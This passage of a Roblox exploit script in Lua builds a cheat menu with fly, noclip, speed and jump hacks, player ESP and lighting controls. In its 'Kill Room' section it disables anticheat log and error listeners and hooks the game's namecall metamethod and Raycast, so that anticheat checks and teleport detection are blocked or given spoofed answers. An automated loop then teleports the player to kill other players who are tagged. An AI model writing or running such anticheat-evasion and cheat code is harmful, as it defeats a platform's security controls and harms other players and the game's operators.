        HumanoidEx = HumanoidCharacter:FindFirstChild("Humanoid")
    end
    
    local AnimatorEx = HumanoidEx:FindFirstChild("Animator") or HumanoidEx:WaitForChild("Animator", 3)
    local animationTrack = AnimatorEx:LoadAnimation(CreatedAnimation)

    animationTrack:Play()
    animationTrack:AdjustSpeed(AnimationSpeed)
    animationTrack.Priority = Enum.AnimationPriority.Action4
    animationTrack.TimePosition = Time
    return animationTrack
end

local function Invisibile()
    local HUD = LocalPlayer.PlayerGui:FindFirstChild("HUD")
    if HUD then
        HUD.Parent = game:GetService("StarterGui")
    else
        local S1, F1 = pcall(function()
            game:GetService("StarterGui"):FindFirstChild("HUD").Parent = LocalPlayer.PlayerGui
            HUD = LocalPlayer.PlayerGui:FindFirstChild("HUD")
        end)
        print(S1, F1)
    end

    UndergroundAnimation = PlayAnimation(Character, "rbxassetid://7189062263", 0, 5)
    LocalPlayer.Character = nil

    UndergroundAnimation:Stop()
    LocalPlayer.Character = Character
    
    local Survived, Died = pcall(function()
        if HUD then
            HUD.Parent = LocalPlayer.PlayerGui
        end
    end)
    print(Survived, Died)
    
    Highlight = Instance.new("Highlight")
    Highlight.Parent = Character
    Highlight.Enabled = true
    isInvisible = true
end

local function Uninvisible()
    PlayAnimation(Character, "rbxassetid://7189062263", 0, 5):Stop()
    
    if Highlight then
        Highlight:Destroy()
        Highlight = nil
    end
    isInvisible = false
end

-- ========================================
-- MOVEMENT PAGE
-- ========================================
local MovementPage, MovementLeft, MovementRight
local flyToggleButton = nil
local function toggleFlyState(enabled)
    flyEnabled = enabled
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root and enabled then
        bv = Instance.new("BodyVelocity", root)
        bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
        bg = Instance.new("BodyGyro", root)
        bg.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
        print("✈️ Fly ENABLED (Press " .. flyKeybind.Name .. " to toggle)")
    else
        if bv then bv:Destroy(); bv = nil end
        if bg then bg:Destroy(); bg = nil end
        print("🚶 Fly DISABLED")
    end
end


local ColorPickerTheme = {
    Bg = Color3.fromRGB(25, 25, 25),
    Element = Color3.fromRGB(24, 22, 32),
    Accent = Color3.fromRGB(140, 180, 255),
    Text = Color3.fromRGB(220, 220, 220),
    Green = Color3.fromRGB(130, 195, 65),
    Red = Color3.fromRGB(200, 60, 60)
}

local function OpenColorPicker(defaultColor, callback)
    local blocker = Instance.new("Frame", ScreenGui)
    blocker.Size = UDim2.new(1, 0, 1, 0)
    blocker.BackgroundColor3 = Color3.new(0, 0, 0)
    blocker.BackgroundTransparency = 0.5
    blocker.ZIndex = 200
    blocker.Active = true

    local picker = Instance.new("Frame", blocker)
    picker.Size = UDim2.new(0, 300, 0, 380)
    picker.Position = UDim2.new(0.5, -150, 0.5, -190)
    picker.BackgroundColor3 = ColorPickerTheme.Bg
    picker.ZIndex = 201
    picker.Active = true
    Instance.new("UICorner", picker).CornerRadius = UDim.new(0, 20)
    
    local pickerStroke = Instance.new("UIStroke", picker)
    pickerStroke.Color = Color3.fromRGB(60, 60, 70)
    pickerStroke.Thickness = 2
    
    local pickerTitle = Instance.new("TextLabel", picker)
    pickerTitle.Size = UDim2.new(1, 0, 0, 40)
    pickerTitle.BackgroundTransparency = 1
    pickerTitle.Text = "Choose ESP Color"
    pickerTitle.TextColor3 = ColorPickerTheme.Text
    pickerTitle.Font = Enum.Font.GothamBold
    pickerTitle.TextSize = 16
    pickerTitle.ZIndex = 202

    local h, s, v = defaultColor:ToHSV()
    local currentHue = h
    local currentSat = s
    local currentVal = v
    
    local preview = Instance.new("Frame", picker)
    preview.Size = UDim2.new(0, 260, 0, 40)
    preview.Position = UDim2.new(0, 20, 0, 50)
    preview.BackgroundColor3 = defaultColor
    preview.ZIndex = 202
    Instance.new("UICorner", preview).CornerRadius = UDim.new(0, 20)

    local satVal = Instance.new("TextButton", picker)
    satVal.Size = UDim2.new(0, 260, 0, 180)
    satVal.Position = UDim2.new(0, 20, 0, 100)
    satVal.BackgroundColor3 = Color3.fromHSV(currentHue, 1, 1)
    satVal.BorderSizePixel = 0
    satVal.ZIndex = 202
    satVal.Text = ""
    satVal.AutoButtonColor = false
    Instance.new("UICorner", satVal).CornerRadius = UDim.new(0, 20)

    local whiteGrad = Instance.new("Frame", satVal)
    whiteGrad.Size = UDim2.new(1, 0, 1, 0)
    whiteGrad.BackgroundColor3 = Color3.new(1, 1, 1)
    whiteGrad.BorderSizePixel = 0
    whiteGrad.ZIndex = 203
    
    local whiteGradient = Instance.new("UIGradient", whiteGrad)
    whiteGradient.Transparency = NumberSequence.new{
        NumberSequenceKeypoint.new(0, 0),
        NumberSequenceKeypoint.new(1, 1)
    }
    whiteGradient.Rotation = 0
    Instance.new("UICorner", whiteGrad).CornerRadius = UDim.new(0, 20)
    
    local blackGrad = Instance.new("Frame", satVal)
    blackGrad.Size = UDim2.new(1, 0, 1, 0)
    blackGrad.BackgroundColor3 = Color3.new(0, 0, 0)
    blackGrad.BorderSizePixel = 0
    blackGrad.ZIndex = 204
    
    local blackGradient = Instance.new("UIGradient", blackGrad)
    blackGradient.Transparency = NumberSequence.new{
        NumberSequenceKeypoint.new(0, 1),
        NumberSequenceKeypoint.new(1, 0)
    }
    blackGradient.Rotation = 90
    Instance.new("UICorner", blackGrad).CornerRadius = UDim.new(0, 20)

    local hueFrame = Instance.new("TextButton", picker)
    hueFrame.Size = UDim2.new(0, 260, 0, 25)
    hueFrame.Position = UDim2.new(0, 20, 0, 290)
    hueFrame.BackgroundColor3 = Color3.new(1, 1, 1)
    hueFrame.ZIndex = 202
    hueFrame.Text = ""
    hueFrame.AutoButtonColor = false
    Instance.new("UICorner", hueFrame).CornerRadius = UDim.new(0, 20)

    local hueGrad = Instance.new("UIGradient", hueFrame)
    hueGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 255, 0)),
        ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)),
        ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 0, 255)),
        ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
    }

    local function updateColor()
        local finalColor = Color3.fromHSV(currentHue, currentSat, currentVal)
        preview.BackgroundColor3 = finalColor
        satVal.BackgroundColor3 = Color3.fromHSV(currentHue, 1, 1)
        return finalColor
    end

    local hueDragging = false
    
    hueFrame.MouseButton1Down:Connect(function()
        hueDragging = true
    end)
    
    hueFrame.MouseButton1Up:Connect(function()
        hueDragging = false
    end)
    
    hueFrame.MouseLeave:Connect(function()
        hueDragging = false
    end)
    
    hueFrame.MouseMoved:Connect(function(x, y)
        if hueDragging then
            local relX = math.clamp((x - hueFrame.AbsolutePosition.X) / hueFrame.AbsoluteSize.X, 0, 1)
            currentHue = relX
            updateColor()
        end
    end)
    
    hueFrame.MouseButton1Click:Connect(function(x, y)
        local relX = math.clamp((x - hueFrame.AbsolutePosition.X) / hueFrame.AbsoluteSize.X, 0, 1)
        currentHue = relX
        updateColor()
    end)

    local svDragging = false
    
    satVal.MouseButton1Down:Connect(function()
        svDragging = true
    end)
    
    satVal.MouseButton1Up:Connect(function()
        svDragging = false
    end)
    
    satVal.MouseLeave:Connect(function()
        svDragging = false
    end)
    
    satVal.MouseMoved:Connect(function(x, y)
        if svDragging then
            local relX = math.clamp((x - satVal.AbsolutePosition.X) / satVal.AbsoluteSize.X, 0, 1)
            local relY = math.clamp((y - satVal.AbsolutePosition.Y) / satVal.AbsoluteSize.Y, 0, 1)
            currentSat = relX
            currentVal = 1 - relY
            updateColor()
        end
    end)
    
    satVal.MouseButton1Click:Connect(function(x, y)
        local relX = math.clamp((x - satVal.AbsolutePosition.X) / satVal.AbsoluteSize.X, 0, 1)
        local relY = math.clamp((y - satVal.AbsolutePosition.Y) / satVal.AbsoluteSize.Y, 0, 1)
        currentSat = relX
        currentVal = 1 - relY
        updateColor()
    end)

    local okBtn = Instance.new("TextButton", picker)
    okBtn.Size = UDim2.new(0, 120, 0, 40)
    okBtn.Position = UDim2.new(0, 20, 0, 325)
    okBtn.Text = "OK"
    okBtn.BackgroundColor3 = ColorPickerTheme.Green
    okBtn.TextColor3 = Color3.new(1, 1, 1)
    okBtn.Font = Enum.Font.GothamBold
    okBtn.TextSize = 14
    okBtn.ZIndex = 203
    Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 20)

    local cancelBtn = Instance.new("TextButton", picker)
    cancelBtn.Size = UDim2.new(0, 120, 0, 40)
    cancelBtn.Position = UDim2.new(1, -140, 0, 325)
    cancelBtn.Text = "Cancel"
    cancelBtn.BackgroundColor3 = ColorPickerTheme.Red
    cancelBtn.TextColor3 = Color3.new(1, 1, 1)
    cancelBtn.Font = Enum.Font.GothamBold
    cancelBtn.TextSize = 14
    cancelBtn.ZIndex = 203
    Instance.new("UICorner", cancelBtn).CornerRadius = UDim.new(0, 20)

    okBtn.MouseButton1Click:Connect(function()
        callback(updateColor())
        blocker:Destroy()
    end)

    cancelBtn.MouseButton1Click:Connect(function()
        blocker:Destroy()
    end)
end

do
MovementPage, MovementLeft, MovementRight = createPage()
MovementPage.Visible = true

local MovementHeader = createSectionHeader("Movement")
MovementHeader.Parent = MovementLeft

flyToggleButton = createToggle(MovementLeft, "Fly", false, toggleFlyState)

local flyKeybindBtn = createButton(MovementLeft, "Fly Key: Tab Right Click]", function() end)
flyKeybindBtn.MouseButton2Click:Connect(function()
    waitingForFlyKey = true
    flyKeybindBtn.Text = "Press Any Key..."
    flyKeybindBtn.BackgroundColor3 = Color3.fromRGB(100, 80, 200)
    local connection
    connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.UserInputType == Enum.UserInputType.Keyboard then
            flyKeybind = input.KeyCode
            waitingForFlyKey = false
            flyKeybindBtn.Text = "Fly Key: " .. flyKeybind.Name .. " [Right Click]"
            TweenService:Create(flyKeybindBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(22, 20, 30)}):Play()
            connection:Disconnect()
        end
    end)
end)

createSlider(MovementLeft, "Fly Speed", 10, 200, 50, function(value) flySpeed = value end)
createToggle(MovementLeft, "Noclip", false, function(enabled) noclipEnabled = enabled end)

createToggle(MovementLeft, "Speed Hack", false, function(enabled) speedHackEnabled = enabled end)
createSlider(MovementLeft, "Walk Speed", 16, 200, 16, function(value) walkSpeed = value end)

local JumpHeader = createSectionHeader("Jump")
JumpHeader.Parent = MovementRight
createToggle(MovementRight, "Jump Hack", false, function(enabled) jumpHackEnabled = enabled end)
createSlider(MovementRight, "Jump Power", 10, 200, 50, function(value) jumpPower = value end)
end

-- PLAYERS PAGE (ESP)
-- ========================================
local PlayersPage, PlayersLeft, PlayersRight
do
PlayersPage, PlayersLeft, PlayersRight = createPage()

local ESPHeader = createSectionHeader("ESP")
ESPHeader.Parent = PlayersLeft

createToggle(PlayersLeft, "Box ESP", false, function(enabled) espBoxEnabled = enabled end)
createToggle(PlayersLeft, "Name ESP", false, function(enabled) espNameEnabled = enabled end)
createToggle(PlayersLeft, "Distance ESP", false, function(enabled) espDistanceEnabled = enabled end)
createToggle(PlayersLeft, "Tracers", false, function(enabled) espTracerEnabled = enabled end)
createSlider(PlayersLeft, "Text Size", 10, 30, 14, function(value) espFontSize = value end)

-- ========================================
-- DAY/NIGHT CONTROL
-- ========================================
local DayNightHeader = createSectionHeader("Day/Night Control")
DayNightHeader.Parent = PlayersRight

-- Сохраняем оригинальные настройки освещения
local OriginalLightingSettings = {
    ClockTime = game.Lighting.ClockTime,
    Brightness = game.Lighting.Brightness,
    Ambient = game.Lighting.Ambient,
    OutdoorAmbient = game.Lighting.OutdoorAmbient
}

local TimeFrozen = false

-- Preset buttons (Dawn, Day, Sunset, Night)
local PresetContainer = Instance.new("Frame")
PresetContainer.Size = UDim2.new(1, 0, 0, 100)
PresetContainer.BackgroundTransparency = 1
PresetContainer.Parent = PlayersRight

local function createTimePreset(name, emoji, time, pos)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(0.48, 0, 0, 42)
    Btn.Position = pos
    Btn.BackgroundColor3 = Color3.fromRGB(30, 28, 38)
    Btn.Text = ""
    Btn.BorderSizePixel = 0
    Btn.Parent = PresetContainer
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 12)
    Corner.Parent = Btn
    
    local EmojiLabel = Instance.new("TextLabel")
    EmojiLabel.Size = UDim2.new(0, 25, 1, 0)
    EmojiLabel.Position = UDim2.new(0, 5, 0, 0)
    EmojiLabel.BackgroundTransparency = 1
    EmojiLabel.Text = emoji
    EmojiLabel.Font = Enum.Font.GothamBold
    EmojiLabel.TextSize = 16
    EmojiLabel.Parent = Btn
    
    local NameLabel = Instance.new("TextLabel")
    NameLabel.Size = UDim2.new(1, -35, 1, 0)
    NameLabel.Position = UDim2.new(0, 30, 0, 0)
    NameLabel.BackgroundTransparency = 1
    NameLabel.Text = name
    NameLabel.Font = Enum.Font.Gotham
    NameLabel.TextSize = 12
    NameLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    NameLabel.TextXAlignment = Enum.TextXAlignment.Left
    NameLabel.Parent = Btn
    
    Btn.MouseEnter:Connect(function()
        TweenService:Create(Btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(100, 80, 200)}):Play()
    end)
    
    Btn.MouseLeave:Connect(function()
        TweenService:Create(Btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(30, 28, 38)}):Play()
    end)
    
    Btn.MouseButton1Click:Connect(function()
        TweenService:Create(game.Lighting, TweenInfo.new(1, Enum.EasingStyle.Quad), {ClockTime = time}):Play()
    end)
end

createTimePreset("Dawn", "🌄", 6, UDim2.new(0, 0, 0, 0))
createTimePreset("Day", "☀️", 12, UDim2.new(0.52, 0, 0, 0))
createTimePreset("Sunset", "🌆", 18, UDim2.new(0, 0, 0, 48))
createTimePreset("Night", "🌙", 0, UDim2.new(0.52, 0, 0, 48))

-- Time Slider
local SliderContainer = Instance.new("Frame")
SliderContainer.Size = UDim2.new(1, 0, 0, 50)
SliderContainer.BackgroundTransparency = 1
SliderContainer.Parent = PlayersRight

local SliderLabel = Instance.new("TextLabel")
SliderLabel.Size = UDim2.new(1, 0, 0, 20)
SliderLabel.BackgroundTransparency = 1
SliderLabel.Text = "Time: " .. string.format("%.1f", game.Lighting.ClockTime)
SliderLabel.Font = Enum.Font.Gotham
SliderLabel.TextSize = 11
SliderLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
SliderLabel.TextXAlignment = Enum.TextXAlignment.Left
SliderLabel.Parent = SliderContainer

local SliderBack = Instance.new("Frame")
SliderBack.Size = UDim2.new(1, 0, 0, 3)
SliderBack.Position = UDim2.new(0, 0, 0, 25)
SliderBack.BackgroundColor3 = Color3.fromRGB(26, 24, 34)
SliderBack.BorderSizePixel = 0
SliderBack.Parent = SliderContainer

local SliderFill = Instance.new("Frame")
SliderFill.Size = UDim2.new(game.Lighting.ClockTime / 24, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(100, 80, 200)
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

local SliderDot = Instance.new("Frame")
SliderDot.Size = UDim2.new(0, 10, 0, 10)
SliderDot.Position = UDim2.new(game.Lighting.ClockTime / 24, -5, 0.5, -5)
SliderDot.BackgroundColor3 = Color3.fromRGB(100, 80, 200)
SliderDot.BorderSizePixel = 0
SliderDot.Parent = SliderBack

local DotCorner = Instance.new("UICorner")
DotCorner.CornerRadius = UDim.new(1, 0)
DotCorner.Parent = SliderDot

local timeSliderDragging = false

SliderBack.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        timeSliderDragging = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        timeSliderDragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if timeSliderDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local mouse = UserInputService:GetMouseLocation().X
        local sliderPos = SliderBack.AbsolutePosition.X
        local sliderSize = SliderBack.AbsoluteSize.X
        
        local percent = math.clamp((mouse - sliderPos) / sliderSize, 0, 1)
        local value = percent * 24
        
        game.Lighting.ClockTime = value
        SliderLabel.Text = "Time: " .. string.format("%.1f", value)
        SliderFill.Size = UDim2.new(percent, 0, 1, 0)
        SliderDot.Position = UDim2.new(percent, -5, 0.5, -5)
    end
end)

-- Freeze Time Toggle
createToggle(PlayersRight, "Freeze Time", false, function(enabled)
    TimeFrozen = enabled
end)

-- Reset Button
createButton(PlayersRight, "🔄 Reset Lighting", function()
    TweenService:Create(game.Lighting, TweenInfo.new(1, Enum.EasingStyle.Quad), {
        ClockTime = OriginalLightingSettings.ClockTime,
        Brightness = OriginalLightingSettings.Brightness,
        Ambient = OriginalLightingSettings.Ambient,
        OutdoorAmbient = OriginalLightingSettings.OutdoorAmbient
    }):Play()
    
    TimeFrozen = false
end)

-- Update loop for time display
task.spawn(function()
    while task.wait(0.5) do
        if not TimeFrozen then
            local currentTime = game.Lighting.ClockTime
            SliderLabel.Text = "Time: " .. string.format("%.1f", currentTime)
            
            local percent = currentTime / 24
            SliderFill.Size = UDim2.new(percent, 0, 1, 0)
            SliderDot.Position = UDim2.new(percent, -5, 0.5, -5)
        end
    end
end)

-- Freeze time logic
RunService.Heartbeat:Connect(function()
    if TimeFrozen then
        game.Lighting.ClockTime = game.Lighting.ClockTime
    end
end)

-- ESP Color Picker Button
do
    local ColorPickerBtn = Instance.new("TextButton")
    ColorPickerBtn.Size = UDim2.new(1, 0, 0, 35)
    ColorPickerBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    ColorPickerBtn.Text = ""
    ColorPickerBtn.Parent = PlayersLeft
    
    local ColorPickerCorner = Instance.new("UICorner")
    ColorPickerCorner.CornerRadius = UDim.new(0, 20)
    ColorPickerCorner.Parent = ColorPickerBtn
    
    -- Текст слева
    local ColorLabel = Instance.new("TextLabel")
    ColorLabel.Size = UDim2.new(0.6, 0, 1, 0)
    ColorLabel.Position = UDim2.new(0, 10, 0, 0)
    ColorLabel.BackgroundTransparency = 1
    ColorLabel.Text = "ESP Color"
    ColorLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
    ColorLabel.Font = Enum.Font.Gotham
    ColorLabel.TextSize = 14
    ColorLabel.TextXAlignment = Enum.TextXAlignment.Left
    ColorLabel.Parent = ColorPickerBtn
    
    -- Превью цвета справа
    local ColorPreview = Instance.new("Frame")
    ColorPreview.Size = UDim2.new(0, 70, 0, 25)
    ColorPreview.Position = UDim2.new(1, -80, 0.5, -12.5)
    ColorPreview.BackgroundColor3 = espBoxColor
    ColorPreview.Parent = ColorPickerBtn
    
    local PreviewCorner = Instance.new("UICorner")
    PreviewCorner.CornerRadius = UDim.new(0, 20)
    PreviewCorner.Parent = ColorPreview
    
    ColorPickerBtn.MouseButton1Click:Connect(function()
        OpenColorPicker(espBoxColor, function(newColor)
            espBoxColor = newColor
            ColorPreview.BackgroundColor3 = newColor
        end)
    end)
    
    ColorPickerBtn.MouseEnter:Connect(function()
        TweenService:Create(ColorPickerBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(100, 80, 200)}):Play()
    end)
    
    ColorPickerBtn.MouseLeave:Connect(function()
        TweenService:Create(ColorPickerBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(35, 35, 45)}):Play()
    end)
end
end

-- ========================================
-- STAND PILOT PAGE
-- ========================================
local StandPilotPage, StandLeft, StandRight
do
StandPilotPage, StandLeft, StandRight = createPage()

local StandHeader = createSectionHeader("Stand Pilot")
StandHeader.Parent = StandLeft

local standEnabled = false
createToggle(StandLeft, "Enable Stand Pilot [H]", false, function(enabled)
    standEnabled = enabled
    if enabled then
        pcall(EnablePilot)
    else
        pcall(DisablePilot)
    end
end)

createSlider(StandLeft, "Stand Speed", 0.5, 5, 1.5, function(value) settings["standspeed"] = value end)
createSlider(StandLeft, "Jump Power", 0.5, 5, 1.5, function(value) settings["pilotjumppower"] = value end)
createSlider(StandLeft, "Body Distance", 5, 100, 37, function(value) settings["bodydistance"] = value end)
createToggle(StandRight, "Hide Body", true, function(enabled) settings["hidebody"] = enabled end)
createToggle(StandRight, "TP Body to Stand", true, function(enabled) settings["tpbodytostand"] = enabled end)
end

-- ========================================
-- FUN & DANCE PAGE
-- ========================================
local FunPage, FunLeft, FunRight
do
FunPage, FunLeft, FunRight = createPage()

-- ========================================
-- AUTO KILL ROOM SETTINGS
-- ========================================
--// Мягкий Anticheat Bypass (не ломает игру)
local success = pcall(function()
    -- Disable только античит логи, но НЕ ВСЕ логи
    for i,v in pairs(getconnections(game:GetService("LogService").MessageOut)) do
        local func = debug.getinfo(v.Function)
        -- Отключаем только если это античит
        if func and func.source and (func.source:find("Anticheat") or func.source:find("AntiExploit")) then
            v:Disable()
        end
    end
    
    for i,v in pairs(getconnections(game:GetService("ScriptContext").Error)) do
        local func = debug.getinfo(v.Function)
        if func and func.source and (func.source:find("Anticheat") or func.source:find("AntiExploit")) then
            v:Disable()
        end
    end
end)

-- НЕ ОТКЛЮЧАЕМ ClientFX! Он нужен для стендов!
-- Вместо этого фильтруем только античит вызовы
pcall(function()
    if game.ReplicatedStorage:FindFirstChild("ClientFX") then
        -- Не отключаем полностью!
        -- ClientFX нужен для визуализации стендов
    end
end)

-- Умный Raycast Hook (не ломает всё)
pcall(function()
    local oldraycast = workspace.Raycast
    workspace.Raycast = function(self, origin, direction, params)
        -- Пропускаем нормальные райкасты
        -- Блокируем только подозрительные античит проверки
        local source = debug.getinfo(2, "s").source
        
        if source and (source:find("Anticheat") or source:find("AntiExploit")) then
            return nil -- Блокируем античит
        end
        
        -- Все остальные райкасты работают нормально
        return oldraycast(self, origin, direction, params)
    end
end)

-- Namecall Hook (этот можно оставить как есть)
pcall(function()
    local mt = getrawmetatable(game)
    local oldnamecall = mt.__namecall
    setreadonly(mt, false)
    
    mt.__namecall = newcclosure(function(self, ...)
        local args = {...}
        local method = getnamecallmethod()
        
        -- Block anticheat kicks
        if method == "FireServer" or method == "InvokeServer" then
            if args[1] == "idklolbrah2de" or args[1] == "CHECKER_1" or args[1] == "GUI_CHECK" then
                return "  ___XP DE KEY"
            end
            
            -- Block suspicious teleport detection
            if args[1] == "OneMoreTime" or args[1] == "TeleportDetect" then
                return
            end
        end
        
        return oldnamecall(self, ...)
    end)
    
    setreadonly(mt, true)
end)

-- Bypass marker
if workspace:FindFirstChild("AnticheatBypass") then
    workspace.AnticheatBypass:Destroy()
end

local bypass = Instance.new("Part", workspace)
bypass.Name = "AnticheatBypass"
bypass.Transparency = 1
bypass.Anchored = true
bypass.CanCollide = false
bypass.Size = Vector3.new(1, 1, 1)
    

local autoKillSettings = {
    enabled = false,
    currentVictim = nil,
    teleportPos = CFrame.new(0, -500, 0),
    kidnappedPosition = nil,
    returnDelay = 0.5
}

-- Player variables for Auto Kill Room
local akPlayer = Players.LocalPlayer
local akCharacter = akPlayer.Character or akPlayer.CharacterAdded:Wait()
local akHRP = nil
local akRemoteEvent = nil

local function UpdateAutoKillCharacter()
    akCharacter = akPlayer.Character or akPlayer.CharacterAdded:Wait()
    akHRP = akCharacter:WaitForChild("HumanoidRootPart", 10)
    akRemoteEvent = akCharacter:WaitForChild("RemoteEvent", 10)
end

UpdateAutoKillCharacter()

akPlayer.CharacterAdded:Connect(function()
    task.wait(2)
    UpdateAutoKillCharacter()
end)

-- ========================================
-- UI ELEMENTS
-- ========================================
local AutoKillHeader = createSectionHeader("Kill Room")
AutoKillHeader.Parent = FunRight

-- Status Display Frame
local AutoKillStatus = Instance.new("Frame")
AutoKillStatus.Size = UDim2.new(1, 0, 0, 70)
AutoKillStatus.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
AutoKillStatus.BorderSizePixel = 0
AutoKillStatus.Parent = FunRight

local AutoKillStatusCorner = Instance.new("UICorner")
AutoKillStatusCorner.CornerRadius = UDim.new(0, 16)
AutoKillStatusCorner.Parent = AutoKillStatus

-- Status Text Line 1
local StatusLine1 = Instance.new("TextLabel")
StatusLine1.Size = UDim2.new(1, -20, 0, 20)
StatusLine1.Position = UDim2.new(0, 10, 0, 8)
StatusLine1.BackgroundTransparency = 1
StatusLine1.Text = "⚡ Status: Waiting..."
StatusLine1.Font = Enum.Font.GothamBold
StatusLine1.TextSize = 12
StatusLine1.TextColor3 = Color3.fromRGB(200, 200, 200)
StatusLine1.TextXAlignment = Enum.TextXAlignment.Left
StatusLine1.Parent = AutoKillStatus

-- Victim Info Line
local StatusLine2 = Instance.new("TextLabel")
StatusLine2.Size = UDim2.new(1, -20, 0, 18)
StatusLine2.Position = UDim2.new(0, 10, 0, 28)
StatusLine2.BackgroundTransparency = 1
StatusLine2.Text = "👤 Victim: None"
StatusLine2.Font = Enum.Font.Gotham
StatusLine2.TextSize = 11
StatusLine2.TextColor3 = Color3.fromRGB(160, 160, 160)
StatusLine2.TextXAlignment = Enum.TextXAlignment.Left
StatusLine2.Parent = AutoKillStatus

-- Position Info Line
local StatusLine3 = Instance.new("TextLabel")
StatusLine3.Size = UDim2.new(1, -20, 0, 18)
StatusLine3.Position = UDim2.new(0, 10, 0, 46)
StatusLine3.BackgroundTransparency = 1
StatusLine3.Text = "📍 Saved Position: None"
StatusLine3.Font = Enum.Font.Gotham
StatusLine3.TextSize = 10
StatusLine3.TextColor3 = Color3.fromRGB(140, 140, 140)
StatusLine3.TextXAlignment = Enum.TextXAlignment.Left
StatusLine3.Parent = AutoKillStatus

-- ========================================
-- MAIN LOGIC
-- ========================================
local function MonitorRoom()
    while autoKillSettings.enabled do
        task.wait(0.1)
        
        if workspace:FindFirstChild("Living") then
            for _, player in pairs(workspace.Living:GetChildren()) do
                -- 🔥 УЛУЧШЕННЫЕ ПРОВЕРКИ:
                local isMe = player.Name == akPlayer.Name
                local hasTag = player:FindFirstChild("InCocoJumbo")
                local hasHumanoid = player:FindFirstChild("Humanoid")
                local isAlive = hasHumanoid and hasHumanoid.Health > 0
                local hasHRP = player:FindFirstChild("HumanoidRootPart")
                
                -- ✅ Атакуем только если:
                -- 1. Это НЕ мы
                -- 2. Есть тег InCocoJumbo
                -- 3. Игрок живой
                -- 4. Есть HumanoidRootPart
                if not isMe and hasTag and isAlive and hasHRP then
                    -- Found someone in room!
                    autoKillSettings.currentVictim = player.Name
                    StatusLine1.Text = "🎯 Status: Target Found!"
                    StatusLine2.Text = "👤 Victim: " .. player.Name
                    
                    -- Save position
                    if akHRP then
                        autoKillSettings.kidnappedPosition = akHRP.CFrame
                        local pos = autoKillSettings.kidnappedPosition.Position
                        StatusLine3.Text = string.format("📍 Saved: %.0f, %.0f, %.0f", pos.X, pos.Y, pos.Z)
                        StatusLine3.TextColor3 = Color3.fromRGB(100, 255, 140)
                        print("✅ Position saved:", autoKillSettings.kidnappedPosition)
                    end
                    
                    -- Auto release loop
                    StatusLine1.Text = "💀 Status: Releasing..."
                    local releaseStart = tick()
                    
                    while autoKillSettings.enabled and 
                          player:FindFirstChild("InCocoJumbo") and 
                          player:FindFirstChild("Humanoid") and 
                          player.Humanoid.Health > 0 and  -- ← ДОБАВЛЕНО
                          tick() - releaseStart < 5 do
                        pcall(function()
                            akHRP.CFrame = autoKillSettings.teleportPos
                            akHRP.Velocity = Vector3.new()
                            akRemoteEvent:FireServer("InputBegan", {["Input"] = Enum.KeyCode.Z, ["HoldW"] = true})
                        end)
                        task.wait()
                    end
                    
                    StatusLine1.Text = "✅ Status: Kill Confirmed!"
                    StatusLine1.TextColor3 = Color3.fromRGB(100, 255, 140)
                    
                    task.wait(autoKillSettings.returnDelay)
                    
                    if autoKillSettings.kidnappedPosition and akHRP then
                        StatusLine1.Text = "🔄 Status: Returning..."
                        StatusLine1.TextColor3 = Color3.fromRGB(100, 180, 255)
                        
                        pcall(function()
                            akHRP.CFrame = autoKillSettings.kidnappedPosition
                            akHRP.Velocity = Vector3.new()
                        end)
                        
                        task.wait(0.3)
                        StatusLine1.Text = "⚡ Status: Waiting..."
                        StatusLine1.TextColor3 = Color3.fromRGB(200, 200, 200)
                    end
                    
                    StatusLine2.Text = "👤 Victim: None"
                    autoKillSettings.currentVictim = nil
                end
            end
        end
    end
end

-- ========================================
-- CONTROLS
-- ========================================
createToggle(FunRight, "Kill Room", false, function(enabled)
    autoKillSettings.enabled = enabled
    
    if enabled then
        StatusLine1.Text = "⚡ Status: Active - Waiting..."
        StatusLine1.TextColor3 = Color3.fromRGB(100, 255, 140)
        StatusLine2.Text = "👤 Victim: None"
        StatusLine3.Text = "📍 Saved Position: None"
        StatusLine3.TextColor3 = Color3.fromRGB(140, 140, 140)
        
        task.spawn(MonitorRoom)
        print("Kill Room ENABLED")
    else
        StatusLine1.Text = "❌ Status: Disabled"
        StatusLine1.TextColor3 = Color3.fromRGB(255, 80, 80)
        StatusLine2.Text = "👤 Victim: None"
        StatusLine3.Text = "📍 Saved Position: None"
        StatusLine3.TextColor3 = Color3.fromRGB(140, 140, 140)
        
        autoKillSettings.currentVictim = nil
        autoKillSettings.kidnappedPosition = nil
        print("Kill Room DISABLED")
    end
end)

createSlider(FunRight, "Return Delay", 0, 2, 0.5, function(value)
    autoKillSettings.returnDelay = value / 10
    print("Return Delay set to:", autoKillSettings.returnDelay, "seconds")
end)

local FunHeader = createSectionHeader("Invisibility")
